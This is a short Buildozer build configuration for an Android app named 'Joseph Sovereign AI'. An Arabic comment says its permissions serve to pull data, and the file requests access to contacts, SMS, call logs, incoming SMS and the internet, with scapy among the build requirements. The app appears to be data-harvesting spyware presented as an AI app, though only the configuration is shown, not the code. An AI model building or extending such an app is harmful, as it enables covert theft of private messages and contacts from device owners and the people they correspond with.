[app]
title = Joseph Sovereign AI
package.name = joseph.sovereign.ai
package.domain = org.test
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 10.0

# الصلاحيات المطلوبة لسحب البيانات (Critical Permissions)
android.permissions = INTERNET, READ_CONTACTS, READ_SMS, READ_CALL_LOG, WRITE_EXTERNAL_STORAGE, RECEIVE_SMS

# المتطلبات البرمجية للبناء
requirements = python3, kivy, pycryptodome, pyqt6, pyjnius, scapy

orientation = portrait
fullscreen = 1
android.arch = arm64-v8a
